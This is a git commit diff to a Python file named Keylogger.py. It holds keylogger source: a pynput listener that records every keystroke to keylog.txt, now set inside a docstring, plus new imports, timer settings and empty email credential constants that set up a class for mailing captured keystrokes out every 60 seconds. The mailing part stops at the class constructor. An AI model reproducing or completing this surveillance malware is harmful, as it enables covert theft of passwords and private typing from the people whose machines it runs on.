e13c4ccda8a57ce31a5e0899d2b0d734d1660697
charlti <charlesthibaultsanc@gmail.com>
2024-06-19 23:29:28 +0200

    new start

--- Keylogger.py
+++ Keylogger.py
@@ -1,13 +1,38 @@
 from pynput import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
+"""
 def get_key(key):
     key_data = str(key)
     key_data = key_data.replace("'", "")
+
+    if key_data == "Key.space":
+        key_data = " "
+    if key_data == "Key.shift":
+        key_data = ""
+    if key_data == "Key.enter":
+        key_data = "\n"
     with open('keylog.txt', 'a') as file:
         file.write(key_data)
 
 with keyboard.Listener(on_press=get_key) as listen:
     listen.join()
+"""
 
+SEND_REPORT_EVERY = 60 # in seconds
+EMAIL_ADRESS = ""
+EMAIL_PASSWORD = ""
 
-# https://www.youtube.com/watch?v=WkE0QJu3ug8
+class Keylogger:
+    def __init__(self, interval, report_method="mail"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+        
+
